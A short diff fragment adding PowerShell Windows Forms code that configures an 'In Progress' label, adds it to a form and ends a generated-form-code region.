+$Progress.Name = 'labelRestoreDescript'
+$Progress.RightToLeft = 'No'
+$Progress.Size = New-Object System.Drawing.Size(450, 50)
+$Progress.TabIndex = 142
+$Progress.Text = 'In Progress'
+$Pg.Controls.Add($Progress)
+[System.Windows.Forms.Application]::DoEvents() 
+
+#endregion Generated Form Code
